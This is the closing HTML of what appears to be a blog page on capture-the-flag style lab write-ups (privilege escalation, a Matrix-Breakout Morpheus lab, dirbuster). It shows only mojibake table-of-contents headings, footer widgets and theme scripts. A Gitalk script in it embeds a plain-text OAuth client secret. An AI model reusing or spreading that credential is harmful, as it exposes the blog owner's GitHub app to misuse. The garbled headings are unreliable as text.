class="toc-link"><span class="toc-text">4.ææƒ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">p.s.é¶æœºå½©è›‹</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">äºŒã€MATRIX-BREAKOUTï¼š2 MORPHEUS[ä¸­çº§]</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">ä¿¡æ¯æ”¶é›†</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">dirbuster</span></a></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">&copy;2022.5 - 2023 By Ttoc</div><div class="footer_custom_text">This blog is mainly used for bloggers to learn and record, I am very happy, if it is helpful to your questions!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="translateLink" type="button" title="ç®€ç¹è½¬æ¢">ç¹</button><a class="icon-V hidden" onclick="switchNightMode()" title="æµ…è‰²å’Œæ·±è‰²æ¨¡å¼è½¬æ¢"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="ç›´è¾¾è¯„è®º"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">æœç´¢</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  æ•°æ®åº“åŠ è½½ä¸­</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="æœç´¢æ–‡ç« " type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function addGitalkSource () {
  const ele = document.createElement('link')
  ele.rel = 'stylesheet'
  ele.href= 'https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css'
  document.getElementsByTagName('head')[0].appendChild(ele)
}

function loadGitalk () {
  function initGitalk () {
    var gitalk = new Gitalk(Object.assign({
      clientID: '9153f63cdb4dae71592a',
      clientSecret: '593e9954e7fd5e6e46f57b66481f50e1adc53afb',
      repo: 'blog-comment',
      owner: 'try-to-change',
      admin: ['try-to-change'],
      id: '215210ed78b20b817fecd10c8ca35249',
      updateCountCallback: commentCount
    },))

    gitalk.render('gitalk-container')
  }

  if (typeof Gitalk === 'function') initGitalk()
  else {
    addGitalkSource()
    getScript('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js').then(initGitalk)
  }
}

function commentCount(n){
  let isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
  if (isCommentCount) {
    isCommentCount.innerHTML= n
  }
}

if ('Gitalk' === 'Gitalk' || !false) {
  if (false) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
  else loadGitalk()
} else {
  function loadOtherComment () {
    loadGitalk()
  }
}</script></div><script src="/js/sun_moon.js" async></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":"ture"},"log":false});</script></body></html>